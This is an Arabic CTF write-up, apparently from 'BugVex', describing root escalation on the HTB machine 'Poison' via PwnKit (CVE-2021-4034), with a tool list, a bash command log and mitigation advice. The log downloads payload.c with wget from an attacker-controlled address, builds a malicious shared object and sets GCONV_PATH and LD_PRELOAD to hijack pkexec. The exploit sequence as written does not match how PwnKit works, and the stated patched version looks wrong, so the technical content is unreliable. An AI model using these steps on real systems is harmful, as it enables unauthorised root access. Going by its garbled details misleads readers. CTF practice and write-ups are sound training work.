# 🕷️ تقرير BugVex الأمني - تصعيد الصلاحيات في HTB "Poison"

## الملخص  
أثناء استكشاف آلة *Poison* من HTB، كنت أبحث في البداية عن صلاحيات sudo الضعيفة أو ملفات setuid.  
لكن بعد تشغيل أداة LinPEAS، ظهر شيء أكثر إثارة: نسخة قديمة من `pkexec`.  
من خلال خبرتي السابقة، عرفت فورًا أنها الثغرة المعروفة باسم **PwnKit** (**CVE-2021-4034**).  
استغلال هذه الثغرة يسمح بتصعيد الصلاحيات إلى root عبر التلاعب بمتغيرات البيئة.

---

## الأدوات المستخدمة  
1. **Nmap** – لاكتشاف الخدمات والمنافذ المفتوحة على الهدف  
2. **Gobuster** – لاكتشاف الأدلة (directories) المخفية باستخدام brute-force  
3. **Burp Suite** – لاعتراض وتحليل طلبات HTTP الخاصة برفع الملفات  
4. **LinPEAS** – كشف أن `pkexec` قد يكون مدخلًا لتصعيد الصلاحيات  
5. **GCC** – لتجميع الحمولة الخبيثة (payload) بصيغة shared object  
6. **Payload مخصص** – مكتبة مشتركة صُمّمت لتصعيد الصلاحيات  
7. **GDB** – استُخدمت بشكل بسيط لمراقبة سلوك البرنامج

---

## سجل الأوامر
```bash
$ nmap -sC -sV -oA scan 10.10.10.84
$ gobuster dir -u http://10.10.10.84 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
$ ssh poison@10.10.10.84
$ wget http://10.10.14.10/payload.c
$ gcc payload.c -o payload.so -shared -fPIC
$ mkdir exploit && mv payload.so exploit/
$ echo 'module UTF-8// POC// payload 2' > exploit/gconv-modules
$ export GIO_USE_VFS=local
$ export PATH=./exploit:$PATH
$ export LD_PRELOAD=./exploit/payload.so
$ export GCONV_PATH=./exploit
$ export CHARSET=POC
$ pkexec
```

---

## الاستنتاج  
الاستغلال تم بنجاح، حيث حصلت على shell بصلاحيات root بدون الحاجة لأي تدخل من المستخدم.  
تبقى **PwnKit** ثغرة خطيرة خصوصًا إذا لم يتم تصحيحها، سواء في تحديات CTF أو في بيئات العالم الحقيقي.  
كانت هذه تجربة ممتعة وأكدت لي أهمية الانتباه لمسارات تصعيد الصلاحيات — حتى القديمة منها.

---

## التوصيات  
- ترقية `pkexec` إلى إصدار مصحح (≥ 0.105)  
- تقييد الوصول إلى أدوات التجميع والبرامج الخطيرة  
- استخدام AppArmor أو SELinux لعزل الصلاحيات  
- مراقبة متغيرات البيئة لكشف أي نشاط غير اعتيادي

---

*تقرير من إعداد **BugVex*** 🕷️
